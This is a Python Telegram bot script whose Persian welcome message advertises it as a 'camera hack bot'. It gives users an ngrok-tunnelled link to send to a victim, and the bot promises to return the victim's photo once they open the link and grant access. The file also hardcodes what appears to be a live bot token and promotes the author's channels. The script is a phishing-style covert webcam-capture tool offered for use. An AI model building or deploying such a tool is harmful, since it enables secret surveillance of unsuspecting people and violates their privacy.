import packages
import telebot
from telebot import types
import json
import subprocess
import threading
import requests
from remain_up import remain_up

remain_up()

bot = telebot.TeleBot("8193457229:AAGH8k1NRdobNGzndOQyA_hJ1hFDhqfI-Aw")

def run_php():
  subprocess.call('php -S 0.0.0.0:5000', shell=True)

def run_ngrok():
    subprocess.call('./ngrok http 5000 -log=stdout > /dev/null', shell=True)

def main():
  ngrok_thread = threading.Thread(target=run_ngrok)
  ngrok_thread.start()

  php_thread = threading.Thread(target=run_php)
  php_thread.start()



@bot.message_handler(commands=['start'])
def send_welcome(message):
    pm1 = '''
سلام
به ربات هک دوربین خوش اومدی👊
🚧اگه لینکو برای کسی بفرسی و اونم بازش کنه و دسترسی بده 
عکسشو میگیره و واست همینجا میفرسه📷


Telegram: @LinuxArmy
YouTube: youtube.com/linuxarmy
Programmer: @MrFploit

🍀برای اینکه لینکتو دریافت کنی بزن رو دکمه زیر👇
    '''
    markup = types.ReplyKeyboardMarkup()
    itembtna = types.KeyboardButton('دریافت لینک')
    markup.row(itembtna)
    bot.send_message(message.chat.id, pm1, reply_markup=markup)


@bot.message_handler(func=lambda message: True)
def send(message):

    tunnels = json.loads(
        requests.get('http://127.0.0.1:4040/api/tunnels').text)['tunnels']

    public_url = [
        tunnel['public_url'] for tunnel in tunnels
        if tunnel['name'] == 'command_line'
    ][0]

    if message.content_type == "text":
        if message.text == "دریافت لینک":
            bot.reply_to(message, f'🎥{public_url}/?q={message.chat.id}')
        

main()
bot.infinity_polling()
